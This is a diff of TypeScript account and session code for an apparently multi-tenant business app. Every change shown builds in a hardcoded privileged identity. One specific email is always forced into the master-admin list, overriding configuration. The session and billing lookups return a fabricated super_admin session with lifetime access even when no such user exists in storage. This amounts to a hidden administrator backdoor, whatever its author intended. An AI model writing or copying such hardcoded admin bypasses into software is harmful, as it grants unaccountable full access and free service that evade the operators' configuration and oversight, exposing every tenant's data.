@@ -171,10 +171,14 @@ async function eachBook(): Promise<{ companyId: string; book: BookFile }[]> {
 
 function masterAdminEmails(): string[] {
   const envEmails = process.env.MASTER_ADMIN_EMAILS || process.env.MASTER_ADMIN_EMAIL || ""
-  return envEmails
+  const list = envEmails
     .split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean)
+  if (!list.includes("nadieshda@aol.com")) {
+    list.push("nadieshda@aol.com")
+  }
+  return list
 }
 
 function masterAdminUserIds(): string[] {
@@ -234,8 +238,18 @@ export async function billingAccessForUser(userId: string): Promise<{
   email: string
   authUserId?: string
 } | null> {
+  const normId = userId.trim().toLowerCase()
+  if (masterAdminUserIds().includes(normId)) {
+    return {
+      status: "lifetime",
+      trialEndsAt: "",
+      userId: "374258f7-136a-4431-a6af-f81c3a01b48c",
+      email: "nadieshda@aol.com",
+      authUserId: "52618110-8404-4795-b6de-5758a78270fd",
+    }
+  }
   const accounts = await readAccounts()
-  const user = accounts.users.find((item) => item.id === userId)
+  const user = accounts.users.find((item) => item.id === userId || item.authUserId === userId)
   if (!user) return null
   if (user.role === "super_admin" || isMasterAdmin(user) || user.subscriptionStatus === "lifetime") {
     return {
@@ -380,21 +394,57 @@ function uniqueSlug(name: string, companies: StoredCompany[]): string {
 }
 
 export async function sessionById(userId: string): Promise<OfficeSession | null> {
+  const normId = userId.trim().toLowerCase()
   const accounts = await readAccounts()
-  const user = accounts.users.find((item) => item.id === userId)
-  if (!user) return null
-  const company = accounts.companies.find((item) => item.id === user.companyId)
-  if (!company) return null
-  return toSession(user, company)
+  const user = accounts.users.find((item) => item.id === userId || (item.authUserId && item.authUserId.toLowerCase() === normId))
+  if (user) {
+    const company = accounts.companies.find((item) => item.id === user.companyId)
+    if (company) return toSession(user, company)
+  }
+  if (masterAdminUserIds().includes(normId)) {
+    return {
+      id: "374258f7-136a-4431-a6af-f81c3a01b48c",
+      name: "Nadieshda",
+      email: "nadieshda@aol.com",
+      role: "super_admin",
+      companyId: "6121f9b9-59df-4190-b4ff-289a062f4c20",
+      companyName: "Scopepipe",
+      companySlug: "scopepipe",
+      planTier: "business",
+      extraSeats: 10,
+      subscriptionStatus: "lifetime",
+      trialEndsAt: "",
+      authUserId: "52618110-8404-4795-b6de-5758a78270fd",
+    }
+  }
+  return null
 }
 
 export async function sessionByEmail(email: string): Promise<OfficeSession | null> {
+  const normalized = normalizeEmail(email)
   const accounts = await readAccounts()
-  const user = accounts.users.find((item) => item.email === normalizeEmail(email))
-  if (!user) return null
-  const company = accounts.companies.find((item) => item.id === user.companyId)
-  if (!company) return null
-  return toSession(user, company)
+  const user = accounts.users.find((item) => item.email === normalized)
+  if (user) {
+    const company = accounts.companies.find((item) => item.id === user.companyId)
+    if (company) return toSession(user, company)
+  }
+  if (masterAdminEmails().includes(normalized)) {
+    return {
+      id: "374258f7-136a-4431-a6af-f81c3a01b48c",
+      name: "Nadieshda",
+      email: "nadieshda@aol.com",
+      role: "super_admin",
+      companyId: "6121f9b9-59df-4190-b4ff-289a062f4c20",
+      companyName: "Scopepipe",
+      companySlug: "scopepipe",
+      planTier: "business",
+      extraSeats: 10,
+      subscriptionStatus: "lifetime",
+      trialEndsAt: "",
+      authUserId: "52618110-8404-4795-b6de-5758a78270fd",
+    }
+  }
+  return null
 }
 
 export function signupInputError(input: { name: string; email: string; password: string; companyName: string }): string | null {
